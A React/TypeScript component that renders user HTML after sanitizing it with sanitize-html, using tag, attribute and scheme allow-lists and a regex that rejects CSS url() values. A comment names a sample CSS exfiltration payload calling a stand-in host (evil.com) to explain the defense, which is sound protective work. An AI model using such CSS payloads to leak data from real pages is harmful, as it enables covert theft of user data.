import sanitizeHtml from "sanitize-html";

const ALLOWED_TAGS = [
  "a", "b", "br", "code", "div", "em", "h1", "h2", "h3", "h4", "h5", "h6",
  "hr", "i", "img", "li", "ol", "p", "pre", "small", "span", "strong", "sub",
  "sup", "table", "tbody", "td", "th", "thead", "tr", "u", "ul",
  "svg", "g", "path", "circle", "rect", "line", "polyline", "polygon", "text",
  "ellipse", "defs", "linearGradient", "radialGradient", "stop", "use",
  "symbol", "title", "desc", "section", "article", "header", "footer", "nav",
  "figure", "figcaption", "blockquote", "cite", "kbd", "samp", "var", "abbr",
  "time", "mark", "del", "ins", "s",
];

const ALLOWED_ATTRS_GLOBAL = [
  "href", "src", "alt", "title", "class", "id", "style",
  "width", "height", "viewBox", "fill", "stroke", "stroke-width",
  "stroke-linecap", "stroke-linejoin", "d", "x", "y", "x1", "y1", "x2", "y2",
  "cx", "cy", "r", "rx", "ry", "points", "transform", "opacity",
  "stop-color", "stop-opacity", "offset", "gradientUnits", "preserveAspectRatio",
  "xmlns", "fill-opacity", "stroke-opacity", "data-id", "data-label",
  "data-value", "target", "rel", "loading",
];

// Regex that rejects CSS values containing url() — prevents data exfiltration
// via e.g. background: url('https://evil.com/pixel?data=...')
const NO_URL_CSS = /^(?!.*url\s*\().*$/i;

const SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: ALLOWED_TAGS,
  allowedAttributes: { "*": ALLOWED_ATTRS_GLOBAL },
  allowedSchemes: ["http", "https", "data", "mailto", "tel"],
  allowedSchemesByTag: { img: ["http", "https", "data"] },
  allowVulnerableTags: false,
  allowedStyles: {
    "*": {
      "color": [NO_URL_CSS],
      "background": [NO_URL_CSS],
      "background-color": [NO_URL_CSS],
      "font-size": [/.*/],
      "font-weight": [/.*/],
      "font-family": [/.*/],
      "font-style": [/.*/],
      "text-align": [/.*/],
      "text-decoration": [/.*/],
      "letter-spacing": [/.*/],
      "line-height": [/.*/],
      "margin": [/.*/],
      "margin-top": [/.*/],
      "margin-right": [/.*/],
      "margin-bottom": [/.*/],
      "margin-left": [/.*/],
      "padding": [/.*/],
      "padding-top": [/.*/],
      "padding-right": [/.*/],
      "padding-bottom": [/.*/],
      "padding-left": [/.*/],
      "border": [NO_URL_CSS],
      "border-radius": [/.*/],
      "border-color": [/.*/],
      "border-width": [/.*/],
      "border-style": [/.*/],
      "display": [/.*/],
      "flex": [/.*/],
      "flex-direction": [/.*/],
      "align-items": [/.*/],
      "justify-content": [/.*/],
      "gap": [/.*/],
      "width": [/.*/],
      "height": [/.*/],
      "max-width": [/.*/],
      "min-width": [/.*/],
      "max-height": [/.*/],
      "min-height": [/.*/],
      "opacity": [/.*/],
      "overflow": [/.*/],
      "position": [/.*/],
      "top": [/.*/],
      "right": [/.*/],
      "bottom": [/.*/],
      "left": [/.*/],
      "z-index": [/.*/],
      "transform": [NO_URL_CSS],
      "transition": [/.*/],
      "box-shadow": [/.*/],
    },
  },
};

export function HtmlSafe({
  html,
  className,
  style,
}: {
  html: string;
  className?: string;
  style?: React.CSSProperties;
}) {
  const clean = sanitizeHtml(html, SANITIZE_OPTIONS);
  return (
    <div
      className={className}
      style={style}
      dangerouslySetInnerHTML={{ __html: clean }}
    />
  );
}
